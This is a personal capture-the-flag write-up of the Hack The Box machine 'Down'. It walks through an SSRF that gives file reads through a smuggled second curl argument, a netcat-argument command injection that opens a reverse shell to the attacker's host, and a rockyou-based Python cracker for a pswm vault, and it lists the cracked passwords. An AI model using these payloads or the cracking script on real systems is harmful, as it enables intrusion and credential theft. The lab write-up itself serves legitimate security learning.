# HTB - Down

---
## General Info
- OS: Linux
- Open ports: 22, 80
- Running services: Apache:80(2.4.52), OpenSSH:22(8.9p1)
- Endpoints: -
- VHosts: -
- Auth: -
- Pwnd date: 1/6/2026

---
## Enumeration  

- Ran nmap and endpoint discovery. (It doesn't redirect to a hostname so I omitted VHost discovery)
- Went to the main page and saw that it takes a URL, requests it, and if it is up then prints the HTML, if it's not, then it prints "It is down :(". This smells a lot to [[SSRF (Server-Side Request Forgery)]], so I'll craft a script to probe against all ports in localhost (it does answer when localhost requested, so I'm guessing there's no sanitization).
  
---
## Exploitation  

> Ok so yeah I learnt some things about curl. If you separate the arguments, you can request several things, and the validation on the backend doesn't seem to care about a second argument. This is how I got file reading, in the request:
> url=http://localhost file:///etc/passwd

- After doing so, I was able to read the source code of the page, stored in `/var/www/html`, which showed me that the page could take another parameter, `expertmode`, which changed the page's behaviour to this code:

```php
$ip = trim($_POST['ip']);
$valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
$port = trim($_POST['port']);
$port_int = intval($port);
$valid_port = filter_var($port_int, FILTER_VALIDATE_INT);

if ( $valid_ip && $valid_port ) {
	$rc = 255; $output = '';
	$ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
	exec($ec . " 2>&1",$output,$rc);
	
	if ( $rc === 0 ) {
		echo "it is up";
	} else {
		echo "it is down";
	}
} else {
	echo "wtv";
}
```

- If you look closely to the source, you can see how the unsanitized port is being passed as a netcat argument. Even if the argument is validated, you can bypass said validation by spacing the arguments (port: `4444 -e`), and by passing the flag `-e` to nc, you can execute whatever you want. So, by crafting the request, you can execute this command in the machine, which gives a reverse shell as user *www-data*:
  `nc -vz myip 4444 -e /bin/bash`.
- Doing so, you discover that in the root folder of said user, the user flag is already present. Got user flag.
- Starting PrivEsc.

---
## PrivEsc

-   I found an interesting binary, `/usr/bin/pswm`, which is a password manager. By searching it, I realized that you can break the master password to the vault, by crafting a script similar to this one:
 ```python
import cryptocode

blob = open("pswm").read()
with open("/home/lenad/htb/resources/SecLists/Passwords/Leaked-Databases/rockyou.txt", encoding="latin-1") as f:
    for line in f:
        pw = line.strip()
        out = cryptocode.decrypt(blob, pw)
        if out and "\t" in out:        # valid decrypt yields tab-separated rows
            print(f"[+] Master password: {pw}")
            print(out)
            break
 ```

- Where pswm is the vault, located in  `/home/aleks/.local/share/pswm`. By running said command, I cracked the password: `flower`. By using said password in the vault, you find another password that you can use to login as root: `1uY3w22uc-Wr{xNHR~+E`.
- Got root flag.

---
## Rabbit holes

 - None

---
## Attack chain

- Exploit [[SSRF (Server-Side Request Forgery)]] to retrieve the page's sc.
- Learn about the advanced mode and exploit Netcat to be able to gain a foothold as www-data
- Get user flag
- Find pswm and crack the master password.
- Get password for root.
- Get root flag.

---
## Learnt

- HTB is painful.
- I had to use A LOT of the guided mode and Claude. This machine was hard, first, because I didn't know the flags and mechanisms of Curl and Netcat. Also, I was too lazy to understand pswm deeply.
- It teaches `escapeshellcmd` ≠ `escapeshellarg`** — that is one of _the_ most common real-world PHP vulns. You will see this exact pattern in actual bug bounty targets. Not a contrived puzzle.
- The `intval`-validates-but-raw-executes mismatch is a genuine "check one thing, use another" logic flaw that shows up everywhere (think: validating a parsed value but acting on the original). Transferable lesson.
- The pswm step taught you to read a tool's _dependency_ and attack the weakest link (the KDF, not the AES). That's the right instinct for every "homemade crypto" target you'll ever hit.
  
---
## Notes  
- Machine rating: Hard.
  
  